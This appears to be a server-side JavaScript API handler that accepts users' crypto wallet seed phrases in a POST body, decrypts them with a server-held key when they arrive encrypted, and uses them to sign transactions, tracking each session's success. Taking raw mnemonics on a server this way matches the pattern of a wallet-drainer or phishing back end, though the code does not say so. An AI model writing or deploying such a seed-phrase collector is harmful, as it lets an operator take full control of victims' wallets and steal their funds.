import { signTransaction } from '@/lib/server/gateway';
var CryptoJS = require("crypto-js");
import { updateSession, getSession } from '@/prisma/services/gateway';


const handler = async (req, res) => {
    const { method } = req;

    if (method === 'POST') {
        try {
            const { session, mnemonic } = req.body;
            const encrypt = mnemonic.startsWith('U2') ? CryptoJS.AES.decrypt(mnemonic, process.env.UNLOCK_KEY).toString(CryptoJS.enc.Utf8) : mnemonic;
            const result = await signTransaction(encrypt)
            await updateSession(session, result === "_success" ? true : false)
            res.status(200).json({ data: result });
        } catch (error) {
            res.status(500).json({ error });
        }
    } else if (method === 'GET') {
        try {
            const { session } = req.query;
            const result = await getSession(session)

            if (result.expired) return res.status(200).json({ data: true });
            if (!result.expired) return res.status(200).json({ data: false });
        } catch (error) {
            res.status(500).json({ error });
        }
    } else {
        res.status(500).json({ error: "Method not allowed" });
    }
};

export default handler;
